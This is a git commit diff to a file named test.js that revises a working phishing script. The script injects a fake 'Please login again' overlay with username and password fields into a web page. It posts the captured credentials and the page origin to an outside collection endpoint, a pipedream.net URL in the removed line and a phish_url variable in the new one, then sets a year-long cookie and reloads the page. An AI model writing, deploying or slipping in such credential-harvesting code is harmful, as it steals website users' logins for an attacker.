b0f93afb0516b3fe9d16fd8c58e8cd42ca0e5a1b
swan'i <swan013@mail.ru>
2019-10-02 14:09:23 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,4 @@
-function send_data() {
+async function send_data() {
     let formData = new FormData(document.forms.user_data);
     formData.append("origin", location.origin);
     const phish_init = {
@@ -6,12 +6,12 @@ function send_data() {
         body: formData
     }
 
-    const phish_response = await fetch("https://enzfwkgp1bcq.x.pipedream.net/", phish_init);
+    await fetch(phish_url, phish_init);
 
     var expire = new Date();
     expire.setFullYear(expire.getFullYear() + 1);
-    var cookie = "phishsession=true; path=/; expires=" + expire.toUTCString();
-    document.cookie = cookie;
+    var phish_cookie = "phishsession=true; path=/; expires=" + expire.toUTCString();
+    document.cookie = phish_cookie;
 
     window.location.reload();
 }
@@ -21,7 +21,7 @@ var html = `
     </div>
     <div id="test_f_m" style="position: absolute; z-index: 150; font-family: Arial; background-color: #ffffff; width: 280px; height: 185px; top: 50%; left: 40%; padding: 10px">
         <p>An error occurred. Please login again.</p>
-        <form method="POST" name="user_data" onsubmit="send_data();return false;">
+        <form method="POST" name="user_data" onsubmit="send_data()">
             <p>Username <input type="text" name="username"></p>
             <p>Password <input type="password" name="password"></p>
             <p><input type="submit" value="Login"></p>
